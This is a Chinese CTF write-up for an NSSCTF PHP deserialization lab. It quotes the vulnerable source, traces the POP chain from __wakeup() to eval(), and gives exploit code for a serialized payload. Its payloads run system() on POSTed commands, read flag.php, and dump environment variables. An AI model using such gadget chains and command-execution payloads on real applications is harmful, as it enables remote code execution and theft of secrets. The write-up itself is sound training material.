# [反序列化靶场] Level15 - POP链前置

## 基本信息

- 题目名称：[反序列化靶场] Level15 - POP链前置
- 题目链接：https://www.nssctf.cn/problem/6297
- 考点清单：PHP 反序列化、POP链、魔术方法、对象属性链
- 工具清单：Burp Suite
- 难度：入门

## 一、看到什么

### 第一轮

**题目关键信息列表：**

1. 提供了 PHP 源码，存在多个类及其构造方法
2. `D` 类中存在 `__wakeup()` 魔术方法
3. `destnation` 类中存在 `action()` 方法，内部使用 `eval()` 执行代码
4. 通过 POST 参数 `o` 接收序列化数据，并使用 `unserialize()` 进行反序列化

**关键源码：**

```php
class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}

class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}

class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeup() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
```

## 二、想到什么解题思路

根据源码审计，可以直接定位到反序列化入口：

```
unserialize($_POST['o']);
```

反序列化时会自动触发 `D::__wakeup()`，而该方法又会调用 `$this->d->action()`

继续跟进 `action()`，可以发现最终执行点：

```
eval($this->cmd->a->b->c);
```

因此，解题的核心是构造一条 POP 链，使反序列化后的对象能够按照预期的属性关系传递，最终将我们指定的 Payload 传入 `eval()`

### 1. Call Chain

根据方法调用关系，可以得到：

- `unserialize()`
- `D::__wakeup()`
- `destnation::action()`
- `eval()`

### 2. Object Property Chain

根据 `action()` 中的属性访问关系：

```
$this->cmd->a->b->c
```

需要构造以下对象关系：

- `D::$d → destnation`
- `destnation::$cmd → A`
- `A::$a → B`
- `B::$b → C`
- `C::$c → Payload`

## 三、尝试过程和结果记录

### 1. 构造 POP 链

根据上面的分析，先创建各个对象，再按照 Object Property Chain 建立属性关系

```php
$a = new A('');
$b = new B('');
$c = new C('phpinfo();');

$a->a = $b;
$b->b = $c;

$target = new destnation($a);
$d = new D($target);

echo urlencode(serialize($d));
```

最终对象关系如下：

```
D
└── d → destnation
         └── cmd → A
                    └── a → B
                               └── b → C
                                          └── c → phpinfo();
```

将序列化结果 URL 编码后，通过 POST 参数 `o` 发送，即可触发整条 POP 链

### 2. 验证代码执行

首先使用：

```
$c = new C('phpinfo();');
```

验证 `eval()` 是否能够正常执行 PHP 代码

![image-20261116084955989](%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%5DLevel15-POP%E9%93%BE%E5%89%8D%E7%BD%AE/image-20261116084955989.png)

### 3. 尝试读取 Flag

进一步尝试使用 `system()` 执行系统命令

```
$c = new C('system($_POST["0"]);');
```

POST 请求中额外传入：

```
0=cat+flag.php
```

[][image-20261116085831642.jpg]

![image-20261116085831642](%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%5DLevel15-POP%E9%93%BE%E5%89%8D%E7%BD%AE/image-20261116085831642.png)

### 4. 尝试读取环境变量

尝试直接通过 PHP 获取环境变量：

```
$c = new C('getenv("FLAG");');
```

![image-20261116090026800](%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%5DLevel15-POP%E9%93%BE%E5%89%8D%E7%BD%AE/image-20261116090026800.png)

无果，遂改用系统命令查看环境变量：

```
$c = new C("system('env');");
```

![image-20261116090059920](%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%5DLevel15-POP%E9%93%BE%E5%89%8D%E7%BD%AE/image-20261116090059920.png)

得到 flag

想来，也可以直接利用前面构造的命令执行 Payload：

```
$c = new C('system($_POST["0"]);');
```

POST 参数：

```
0=env
```

![image-20261116090343723](%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%5DLevel15-POP%E9%93%BE%E5%89%8D%E7%BD%AE/image-20261116090343723.png)

## 四、总结与反思

### 1. POP 链分析方法

遇到 PHP 反序列化题目，可以按照以下顺序进行分析：

1. 定位 `unserialize()`，寻找反序列化入口
2. 寻找自动触发的魔术方法，例如 `__wakeup()`、`__destruct()`，构造 调用链
3. 根据调用链，构造对象属性链
4. 然后，依据对象属性链，撰写 exp

### 2. 调用链与对象属性链

- Call Chain 决定需要触发哪些方法以及执行顺序；

- Object Property Chain 决定 EXP 中需要创建哪些对象，以及如何建立对象之间的属性关系

### 3. `getenv("FLAG")` **为什么没有输出？**

`eval()` 执行代码时，表达式的返回值不会自动打印

```
eval('getenv("FLAG");');       // 不会自动输出
eval('echo getenv("FLAG");');  // 会输出
```

而 `system('env')` 会直接将命令输出显示出来

